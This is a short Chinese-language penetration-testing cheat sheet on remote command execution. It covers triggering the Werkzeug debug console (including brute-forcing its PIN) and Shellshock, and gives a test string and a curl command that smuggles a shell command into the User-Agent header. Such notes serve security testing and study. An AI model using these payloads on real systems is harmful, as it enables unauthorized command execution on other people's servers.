## 远程命令执行

**Werkzeug Debugger**

找到可以提供用户输入的地方，并提交以下字符串以引起错误:

```
strіng
```

如果目标在调试模式下运行其应用程序，您可能能够运行命令。如果您在本地运行目标，您可能会强行使用调试器PIN。调试器引脚的格式总是:' ***-***-*** '。

**Shellshock Bug**

```bash
() { :;}; echo vulnerable
```

```zsh
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```

